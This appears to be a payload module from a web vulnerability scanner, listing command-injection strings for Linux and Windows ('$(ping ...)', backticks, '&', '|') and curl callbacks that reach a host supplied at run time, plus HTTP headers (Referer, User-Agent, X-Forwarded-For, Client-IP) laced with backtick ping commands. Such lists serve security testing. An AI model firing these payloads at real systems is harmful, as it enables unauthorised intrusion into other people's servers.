#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from config import headers

payloads = [
    # Linux
    '$(ping -c 1 {})',
    '`ping -c 1 {}`',

    # Windows
    '&ping -n 1 {}',
    '&&ping -n 1 {}',
    '|ping -n 1 {}',
]

curl_payloads = [
    '$(curl {})',
    '`curl {}`',
]

# 头污染
headers = {
    'Referer': '{} `ping -c 1 {}`',
    'User-Agent': headers['User-Agent'].replace('(', '').replace(')', '') + '`ping -c 1 {}`',
    'X-Forwarded-For': '8.8.8.8 `ping -c 1 {}`',
    'Client-IP': '`8.8.8.8 `ping -c 1 {}`',
}